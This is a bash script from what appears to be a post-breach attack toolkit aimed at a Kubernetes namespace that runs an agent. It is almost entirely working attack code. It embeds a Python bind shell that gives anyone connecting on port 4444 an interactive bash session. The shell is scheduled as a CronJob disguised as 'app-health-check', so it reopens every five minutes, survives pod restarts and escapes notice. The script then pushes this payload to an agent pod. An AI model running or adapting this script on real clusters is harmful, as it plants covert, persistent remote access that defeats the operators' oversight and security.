#!/usr/bin/env bash
# Persistence: create a CronJob via k8s API that periodically re-opens
# the bind shell. Survives pod restarts.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-persist-cronjob.sh"
  echo "  Creates a Kubernetes CronJob that re-opens a bind shell every 5 minutes."
  echo "  Disguised as a health-check job. Survives pod restarts."
  echo ""
  echo "  Requires: bind shell open + RBAC with batch/cronjobs create permission"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Post-Breach: CronJob Persistence"

PYTHON_CODE="${K8S_API_PREAMBLE}

print('=' * 60)
print('  PERSISTENCE: CronJob Bind Shell Reopener')
print('=' * 60)

agent_ns = '${AGENT_NS}'
bind_port = ${BIND_PORT}

shell_code = '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',''' + str(bind_port) + '''))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(['/bin/bash','-i'])
'''

# Disguised as a health check
cronjob = {
    'apiVersion': 'batch/v1',
    'kind': 'CronJob',
    'metadata': {
        'name': 'app-health-check',
        'namespace': agent_ns,
        'labels': {
            'app.kubernetes.io/name': 'health-check',
            'app.kubernetes.io/component': 'monitoring'
        }
    },
    'spec': {
        'schedule': '*/5 * * * *',
        'successfulJobsHistoryLimit': 1,
        'failedJobsHistoryLimit': 1,
        'jobTemplate': {
            'spec': {
                'template': {
                    'spec': {
                        'containers': [{
                            'name': 'check',
                            'image': 'python:3.12-slim',
                            'command': ['python3', '-c', shell_code]
                        }],
                        'restartPolicy': 'Never'
                    }
                }
            }
        }
    }
}

print(f'  Target namespace: {agent_ns}')
print(f'  CronJob name:     app-health-check')
print(f'  Schedule:         */5 * * * *')
print(f'  Bind port:        {bind_port}')
print()

result, status = k8s_post(f'/apis/batch/v1/namespaces/{agent_ns}/cronjobs', cronjob)

if status == 201:
    print('  CronJob created successfully.')
    print('  Bind shell will reopen every 5 minutes.')
elif status == 409:
    print('  CronJob already exists.')
elif status == 403:
    print(f'  Access denied (HTTP {status}). RBAC does not allow CronJob creation.')
    print('  This attack requires batch/cronjobs create permission.')
else:
    print(f'  Failed: HTTP {status}')
    print(f'  Response: {json.dumps(result, indent=2)[:500]}')

print()
print('CronJob persistence complete.')
"

echo "  Piping CronJob persistence script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "CronJob persistence attempt complete."
